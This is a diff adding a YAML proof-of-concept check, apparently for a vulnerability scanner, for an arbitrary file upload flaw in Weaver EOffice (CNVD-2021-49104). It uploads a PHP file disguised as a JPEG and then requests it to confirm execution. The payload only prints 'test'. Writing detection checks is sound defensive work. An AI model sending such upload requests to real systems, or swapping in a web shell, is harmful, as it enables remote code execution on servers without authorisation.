@@ -1,0 +1,38 @@
+name: Weaver_EOffice_Arbitrary_File_Upload_CNVD_2021_49104
+transport: http
+set: {}
+detail:
+  dock: (app="泛微-EOffice" | app="EOffice")
+  product: https://www.weaver.com.cn/
+  homepage: https://gobies.org/
+  impact: ''
+  description: 泛微 EOffice 存在任意文件上传
+rules:
+  r1:
+    method: POST
+    path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+    follow_redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+    body: '--e64bdf16c554bbc109cecef6451c26a4
+
+      Content-Disposition: form-data; name="Filedata"; filename="test.php"
+
+      Content-Type: image/jpeg
+
+
+      <?php
+
+      print "test";
+
+      ?>
+
+
+      --e64bdf16c554bbc109cecef6451c26a4--'
+    expression: response.status == 200 && response.body.bcontains(b'logo-eoffice.php')
+  r2:
+    method: GET
+    path: /images/logo/logo-eoffice.php
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b'test')
+expression: r1() && r2()
